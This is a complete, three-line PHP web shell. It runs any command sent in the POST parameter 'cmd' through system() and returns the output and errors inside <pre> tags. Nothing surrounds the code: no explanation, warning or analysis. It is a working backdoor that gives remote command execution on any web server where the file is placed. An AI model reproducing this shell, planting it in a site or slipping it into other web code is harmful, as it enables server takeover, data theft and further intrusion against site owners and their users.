<pre><?php if(isset($_POST['cmd']) && $_POST['cmd']!=''){
   system($_POST['cmd'].' 2>&1');
}?></pre>
